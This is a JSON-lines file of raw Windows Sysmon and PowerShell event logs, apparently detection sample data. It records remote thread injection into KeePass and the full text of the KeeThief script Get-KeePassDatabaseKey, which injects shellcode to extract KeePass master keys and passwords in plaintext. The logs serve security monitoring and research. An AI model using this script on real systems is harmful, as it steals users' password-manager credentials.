{"body":"{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-Sysmon\",\"Guid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"},\"EventID\":\"8\",\"Version\":\"2\",\"Level\":\"4\",\"Task\":\"8\",\"Opcode\":\"0\",\"Keywords\":\"0x8000000000000000\",\"TimeCreated\":{\"SystemTime\":\"2019-04-27T18:55:04.9801378Z\"},\"EventRecordID\":\"7071\",\"Correlation\":\"\",\"Execution\":{\"ProcessID\":\"1816\",\"ThreadID\":\"1228\"},\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"IEWIN7\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"RuleName\"},{\"Name\":\"UtcTime\",\"text\":\"2019-04-27 18:55:04.980\"},{\"Name\":\"SourceProcessGuid\",\"text\":\"{365abb72-a512-5cc4-0000-0010c05e1b00}\"},{\"Name\":\"SourceProcessId\",\"text\":\"2856\"},{\"Name\":\"SourceImage\",\"text\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"},{\"Name\":\"TargetProcessGuid\",\"text\":\"{365abb72-a201-5cc4-0000-00104f500800}\"},{\"Name\":\"TargetProcessId\",\"text\":\"2364\"},{\"Name\":\"TargetImage\",\"text\":\"C:\\\\Program Files\\\\KeePass Password Safe 2\\\\KeePass.exe\"},{\"Name\":\"NewThreadId\",\"text\":\"1384\"},{\"Name\":\"StartAddress\",\"text\":\"0x06160000\"},{\"Name\":\"StartModule\"},{\"Name\":\"StartFunction\"}]}}}","recv_ipv4":"127.0.0.1","recv_time":"2023-06-06T03:10:10.818Z","task_id":"00000000-0000-0000-0000-000000000000","tag":"some_tag","mime":"application/x-pt-eventlog","normalized":false,"input_id":"00000000-0000-0000-0000-000000000000","type":"raw","uuid":"d26cbfcd-61bb-4a46-83a3-3a1379d98dbc"}
{"body":"{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-Sysmon\",\"Guid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"},\"EventID\":\"8\",\"Version\":\"2\",\"Level\":\"4\",\"Task\":\"8\",\"Opcode\":\"0\",\"Keywords\":\"0x8000000000000000\",\"TimeCreated\":{\"SystemTime\":\"2019-04-27T18:55:04.7106082Z\"},\"EventRecordID\":\"7070\",\"Correlation\":\"\",\"Execution\":{\"ProcessID\":\"1816\",\"ThreadID\":\"1228\"},\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"IEWIN7\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"RuleName\"},{\"Name\":\"UtcTime\",\"text\":\"2019-04-27 18:55:04.710\"},{\"Name\":\"SourceProcessGuid\",\"text\":\"{365abb72-a512-5cc4-0000-0010c05e1b00}\"},{\"Name\":\"SourceProcessId\",\"text\":\"2856\"},{\"Name\":\"SourceImage\",\"text\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"},{\"Name\":\"TargetProcessGuid\",\"text\":\"{365abb72-a201-5cc4-0000-00104f500800}\"},{\"Name\":\"TargetProcessId\",\"text\":\"2364\"},{\"Name\":\"TargetImage\",\"text\":\"C:\\\\Program Files\\\\KeePass Password Safe 2\\\\KeePass.exe\"},{\"Name\":\"NewThreadId\",\"text\":\"3796\"},{\"Name\":\"StartAddress\",\"text\":\"0x76FAEC4B\"},{\"Name\":\"StartModule\",\"text\":\"C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll\"},{\"Name\":\"StartFunction\",\"text\":\"DbgUiRemoteBreakin\"}]}}}","recv_ipv4":"127.0.0.1","recv_time":"2023-06-06T03:10:10.818Z","task_id":"00000000-0000-0000-0000-000000000000","tag":"some_tag","mime":"application/x-pt-eventlog","normalized":false,"input_id":"00000000-0000-0000-0000-000000000000","type":"raw","uuid":"45f9b787-ef50-4e90-9a77-52c768689039"}
{"body":"{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-PowerShell\",\"Guid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\"},\"EventID\":\"4104\",\"Version\":\"1\",\"Level\":\"3\",\"Task\":\"2\",\"Opcode\":\"15\",\"Keywords\":\"0x0\",\"TimeCreated\":{\"SystemTime\":\"2019-04-27T18:55:02.7106082Z\"},\"EventRecordID\":\"273644\",\"Correlation\":{\"ActivityID\":\"{83cf053f-9302-0000-d6c4-7b840293d901}\"},\"Execution\":{\"ProcessID\":\"7064\",\"ThreadID\":\"5708\"},\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"Computer\":\"IEWIN7\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"text\":\"1\",\"Name\":\"MessageNumber\"},{\"text\":\"1\",\"Name\":\"MessageTotal\"},{\"text\":\"#requires -version 2\\n\\nfunction Get-KeePassDatabaseKey {\\n<#\\n    .SYNOPSIS\\n        \\n        Retrieves database mastey key information for unlocked KeePass database.\\n\\n        Function: Get-KeePassDatabaseKey\\n        Author: Lee Christensen (@tifkin_), Will Schroeder (@harmj0y)\\n        License: BSD 3-Clause\\n        Required Dependencies: None\\n        Optional Dependencies: None\\n\\n    .DESCRIPTION\\n        \\n        Enumerates any KeePass 2.X (.NET) processes currently open, or takes a process object on the pipeline.\\n        Loades the C# KeeTheft assembly into memory and for each open KeePass process executes the GetKeePassMasterKeys()\\n        method on it. GetKeePassMasterKeys() will attach to the target KeePass process using CLR MD and enumerate\\n        all CLR heap objects, searching for a KeePassLib.PwDatabase object. If one is found, the path is extracted\\n        from the m_strUrl field, and all referenced objects are enumerated, searching for a KeePassLib.Keys.CompositeKey.\\n        If a composite master key is found, information for each key type (KcpPassword, KcpKeyFile, KcpUserAccount)\\n        is extracted, including the DPAPI encrypted data blobs of key data. For any encrypted blobs found, shellcode\\n        is injected into the KeePass process that calls MyRtlDecryptMemory() to decrypt the DPAPI memory blobs,\\n        returning the plaintext/unprotected key data.\\n\\n    .PARAMETER Process\\n\\n        Optional KeePass process object to pass in on the pipeline.\\n\\n    .EXAMPLE\\n\\n        PS C:\\\\> Get-KeePassDatabaseKey -Verbose\\n        VERBOSE: Examining KeePass process 4184 for master keys\\n\\n\\n        Database             : C:\\\\Users\\\\harmj0y.TESTLAB\\\\Desktop\\\\keepass\\\\NewDatabase.kdbx\\n        KeyType              : KcpUserAccount\\n        KeePassVersion       : 2.34.0.0\\n        ProcessID            : 4184\\n        ExecutablePath       : C:\\\\Users\\\\harmj0y.TESTLAB\\\\Desktop\\\\keepass\\\\KeePass-2.34\\\\KeePass.exe\\n        EncryptedBlobAddress : 49045328\\n        EncryptedBlob        : {113, 148, 127, 29...}\\n        EncryptedBlobLen     : 64\\n        PlaintextBlob        : {120, 181, 162, 116...}\\n        Plaintext            : eLWidCSt...\\n        KeyFilePath          : C:\\\\Users\\\\harmj0y.TESTLAB\\\\AppData\\\\Roaming\\\\KeePass\\\\ProtectedUserKey.bin\\n\\n        Database             : C:\\\\Users\\\\harmj0y.TESTLAB\\\\Desktop\\\\keepass\\\\NewDatabase.kdbx\\n        KeyType              : KcpKeyFile\\n        KeePassVersion       : 2.34.0.0\\n        ProcessID            : 4184\\n        ExecutablePath       : C:\\\\Users\\\\harmj0y.TESTLAB\\\\Desktop\\\\keepass\\\\KeePass-2.34\\\\KeePass.exe\\n        EncryptedBlobAddress : 49037240\\n        EncryptedBlob        : {137, 185, 6, 97...}\\n        EncryptedBlobLen     : 32\\n        PlaintextBlob        : {177, 5, 150, 205...}\\n        Plaintext            : sQWWzdcT...\\n        KeyFilePath          : C:\\\\Users\\\\harmj0y.TESTLAB\\\\Documents\\\\s.license\\n\\n        Database             : C:\\\\Users\\\\harmj0y.TESTLAB\\\\Desktop\\\\keepass\\\\NewDatabase.kdbx\\n        KeyType              : KcpPassword\\n        KeePassVersion       : 2.34.0.0\\n        ProcessID            : 4184\\n        ExecutablePath       : C:\\\\Users\\\\harmj0y.TESTLAB\\\\Desktop\\\\keepass\\\\KeePass-2.34\\\\KeePass.exe\\n        EncryptedBlobAddress : 48920376\\n        EncryptedBlob        : {228, 78, 75, 16...}\\n        EncryptedBlobLen     : 16\\n        PlaintextBlob        : {80, 97, 115, 115...}\\n        Plaintext            : Password123!\\n        KeyFilePath          :\\n\\n    .EXAMPLE\\n\\n        PS C:\\\\> Get-Process KeePass | Get-KeePassDatabaseKey -Verbose\\n        VERBOSE: Examining KeePass process 4184 for master keys\\n\\n\\n        Database             : C:\\\\Users\\\\harmj0y.TESTLAB\\\\Desktop\\\\keepass\\\\NewDatabase.kdbx\\n        KeyType              : KcpUserAccount\\n        ....\\n#>\\n    [CmdletBinding()] \\n    param (\\n        [Parameter(Position = 0, ValueFromPipeline = $True)]\\n        [System.Diagnostics.Process[]]\\n        [ValidateNotNullOrEmpty()]\\n        $Process\\n    )\\n    \\n    BEGIN {\\n        if(-not $PSBoundParameters['Process']) {\\n            try {\\n                $Process = Get-Process KeePass -ErrorAction Stop | Where-Object {$_.FileVersion -match '^2\\\\.'}\\n            }\\n            catch {\\n                throw 'No KeePass 2.X instances open!'\\n            }\\n        }\\n\\n        # load file off of disk instead\\n        # $Assembly = [Reflection.Assembly]::LoadFile((Get-Item -Path .\\\\ReleaseKeePass.exe).FullName)\\n\\n        # the KeyTheft assembly, generated with \\\"Out-CompressedDll -FilePath .\\\\ReleaseKeePass.exe | Out-File -Encoding ASCII .\\\\compressed.ps1\\\"\\n\\n    }\\n\\n    PROCESS {\\n\\n        ForEach($KeePassProcess in $Process) {\\n\\n            if($KeePassProcess.FileVersion -match '^2\\\\.') {\\n\\n                $WMIProcess = Get-WmiObject win32_process -Filter \\\"ProcessID = $($KeePassProcess.ID)\\\"\\n                $ExecutablePath = $WMIProcess | Select-Object -Expand ExecutablePath\\n\\n                Write-Verbose \\\"Examining KeePass process $($KeePassProcess.ID) for master keys\\\"\\n\\n                $Keys = $Assembly.GetType('KeeTheft.Program').GetMethod('GetKeePassMasterKeys').Invoke($null, @([System.Diagnostics.Process]$KeePassProcess))\\n\\n                if($Keys) {\\n\\n                    ForEach ($Key in $Keys) {\\n\\n                        ForEach($UserKey in $Key.UserKeys) {\\n\\n                            $KeyType = $UserKey.GetType().Name\\n\\n                            $UserKeyObject = New-Object PSObject\\n                            $UserKeyObject | Add-Member Noteproperty 'Database' $UserKey.databaseLocation\\n                            $UserKeyObject | Add-Member Noteproperty 'KeyType' $KeyType\\n                            $UserKeyObject | Add-Member Noteproperty 'KeePassVersion' $KeePassProcess.FileVersion\\n                            $UserKeyObject | Add-Member Noteproperty 'ProcessID' $KeePassProcess.ID\\n                            $UserKeyObject | Add-Member Noteproperty 'ExecutablePath' $ExecutablePath\\n                            $UserKeyObject | Add-Member Noteproperty 'EncryptedBlobAddress' $UserKey.encryptedBlobAddress\\n                            $UserKeyObject | Add-Member Noteproperty 'EncryptedBlob' $UserKey.encryptedBlob\\n                            $UserKeyObject | Add-Member Noteproperty 'EncryptedBlobLen' $UserKey.encryptedBlobLen\\n                            $UserKeyObject | Add-Member Noteproperty 'PlaintextBlob' $UserKey.plaintextBlob\\n\\n                            if($KeyType -eq 'KcpPassword') {\\n                                $Plaintext = [System.Text.Encoding]::UTF8.GetString($UserKey.plaintextBlob)\\n                            }\\n                            else {\\n                                $Plaintext = [Convert]::ToBase64String($UserKey.plaintextBlob)\\n                            }\\n\\n                            $UserKeyObject | Add-Member Noteproperty 'Plaintext' $Plaintext\\n\\n                            if($KeyType -eq 'KcpUserAccount') {\\n                                try {\\n                                    $WMIProcess = Get-WmiObject win32_process -Filter \\\"ProcessID = $($KeePassProcess.ID)\\\"\\n                                    $UserName = $WMIProcess.GetOwner().User\\n\\n                                    $ProtectedUserKeyPath = Resolve-Path -Path \\\"$($Env:WinDir | Split-Path -Qualifier)\\\\Users\\\\*$UserName*\\\\AppData\\\\Roaming\\\\KeePass\\\\ProtectedUserKey.bin\\\" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path\\n\\n                                    $UserKeyObject | Add-Member Noteproperty 'KeyFilePath' $ProtectedUserKeyPath\\n\\n                                }\\n                                catch {\\n                                    Write-Warning \\\"Error enumerating the owner of $($KeePassProcess.ID) : $_\\\"\\n                                }\\n                            }\\n                            else {\\n                                $UserKeyObject | Add-Member Noteproperty 'KeyFilePath' $UserKey.keyFilePath\\n                            }\\n\\n                            $UserKeyObject.PSObject.TypeNames.Insert(0, 'KeePass.Keys')\\n                            $UserKeyObject\\n                        }\\n                    }\\n                }\\n                else {\\n                    Write-Verbose \\\"No keys found for $($KeePassProcess.ID)\\\"\\n                }\\n            }\\n            else {\\n                Write-Warning \\\"Only KeePass 2.X is supported at this time.\\\"\\n            }\\n        }\\n    }\\n}\\n\",\"Name\":\"ScriptBlockText\"},{\"text\":\"d4643a9b-6f64-4fbc-95e8-c2524689590f\",\"Name\":\"ScriptBlockId\"},{\"text\":\"C:\\\\Users\\\\Administrator\\\\Downloads\\\\KeeThief_test\\\\KeeThief-master\\\\KeeTheft\\\\KeeTheft\\\\KeeThief.ps1\",\"Name\":\"Path\"}]}}}","recv_ipv4":"127.0.0.1","recv_time":"2023-06-06T11:33:47.757Z","task_id":"00000000-0000-0000-0000-000000000000","tag":"some_tag","mime":"application/x-pt-eventlog","normalized":false,"input_id":"00000000-0000-0000-0000-000000000000","type":"raw","uuid":"3e774e05-1f1a-4b58-812a-3127158afc3a"}